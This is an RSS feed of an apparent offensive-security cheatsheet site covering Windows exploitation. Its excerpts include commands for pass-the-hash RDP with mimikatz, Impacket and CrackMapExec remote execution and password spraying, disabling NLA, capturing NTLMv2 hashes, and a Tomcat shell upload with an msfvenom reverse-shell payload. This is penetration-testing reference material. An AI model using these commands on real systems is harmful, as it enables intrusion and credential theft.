<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exploitation on Offensive Security Cheatsheet</title>
    <link>/windows-systems/exploitation/</link>
    <description>Recent content in Exploitation on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/windows-systems/exploitation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Exploitation Tricks</title>
      <link>/windows-systems/exploitation/exploitation_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
      <description>Obfuscation # There are many ways you can use to obfuscate conten # PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features $ python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1 Monitoring LDAP changes during attacks - LDAPMonitor https://github.com/p0dalirius/LDAPmonitor # Monitor creation, deletion and changes to LDAP objects live during your pentest or system administration! # You need to be administrator in order to access events ID ./LDAPmonitor.py -d domain.local -u Admin -p &amp;#34;password&amp;#34; --dc-ip xx.xx.xx.xx &amp;ldquo;Double Hop&amp;rdquo; - What is it and how to solve ?</description>
    </item>
    
    <item>
      <title>Remote Execution Techniques</title>
      <link>/windows-systems/exploitation/remote_execution_techniques/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/remote_execution_techniques/</guid>
      <description>Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket # psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP &amp;lt;command&amp;gt; # smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here.  # Instantiating a local smbserver to receive the output of the commands.  # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP &amp;lt;command&amp;gt; # atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</description>
    </item>
    
    <item>
      <title>CrackMapExec</title>
      <link>/windows-systems/exploitation/crackmapexec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/crackmapexec/</guid>
      <description>TOC  Connexions &amp;amp; Spraying Enumeration Execution &amp;amp; Co Getting credentials Using the database Modules Getting shells  # General help crackmapexec --help # Protocol help cracmapexec smb --help Connexions &amp;amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt # Null session crackmapexec smb 192.168.10.1 -u &amp;#34;&amp;#34; up &amp;#34;&amp;#34; # Connect to target using local account crackmapexec smb 192.</description>
    </item>
    
    <item>
      <title>Impacket</title>
      <link>/windows-systems/exploitation/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/impacket/</guid>
      <description>Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  General # Almost every Impacket scripts follows the same option syntaxauthentication:-hashes LMHASH:NTHASHNTLM hashes, format is LMHASH:NTHASH-no-pass don&#39;t ask for password (useful for -k)-k Use Kerberos authentication. Grabs credentials fromccache file (KRB5CCNAME) based on target parameters.If valid credentials cannot be found, it will use theones specified in the command line-aesKey hex key AES key to use for Kerberos Authentication (128 or 256bits)connection:-dc-ip ip address IP Address of the domain controller.</description>
    </item>
    
    <item>
      <title>Kerberos</title>
      <link>/windows-systems/exploitation/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/kerberos/</guid>
      <description>Cheatsheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a KRB5CONF : https://gist.github.com/kaluche/ba69e701624c2e44e3d1f60c5370cebe
General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC) NTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 # NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</description>
    </item>
    
    <item>
      <title>RDP Exploitation</title>
      <link>/windows-systems/exploitation/rdp_exploitation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable # RDP through Pass-the-Hash xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local # RDP using mimikatz and PtH sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:&amp;#34;mstsc.exe /restrictedadmin&amp;#34; cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable Powershell # Requires admin privileges or being able to run as sudo (using powershell sudo.</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/windows-systems/exploitation/file_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/file_transfer/</guid>
      <description>/etc/init.d/pure-ftpd SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords # Since Windows 10, you can&amp;#39;t do anonymous smb server anymore sudo python smbserver.</description>
    </item>
    
    <item>
      <title>IIS</title>
      <link>/windows-systems/exploitation/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/iis/</guid>
      <description>Tomcat Tips &amp;amp; Tricks # Two interfaces for tomcat /manager /host-manager # default root for IIS is  C:\inetpub\wwwroot # Instead of using complicated relative path of the application use that one. # Upload to:  C:\inetpub\wwwroot\shell.jsp curl http://13.33.3.37/shell.jsp Exploiting the classic Manager # Metasploit provides an easy to use module to upload files and get a shell use exploit/multi/http/tomcat_mgr_upload msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rhost 192.168.1.101 msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rport 8080 msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httpusername tomcat msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httppassword tomcat msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; exploit # But also possible to only generate a WAR payload msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.</description>
    </item>
    
    <item>
      <title>IPv6</title>
      <link>/windows-systems/exploitation/ipv6/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/ipv6/</guid>
      <description>Mitm6 # Resources https://github.com/fox-it/mitm6 https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/ https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ https://systemadminspro.com/domain-attacks-getting-an-account/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://blog.vonahi.io/taking-over-ipv6-networks/ https://intrinium.com/mitm6-pen-testing/ # mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. # It does this by replying to DHCPv6 messages, providing victims with a link-local # IPv6 address and setting the attackers host as default DNS server # When using mitm6, it issues a DHCPv6 lease to clients that last for a period of 300 seconds (or 5 minutes) # Due to this, it&amp;#39;s possible that several DNS queries will actually fail, resulting in clients # not being able to access services that rely on DNS names.</description>
    </item>
    
  </channel>
</rss>
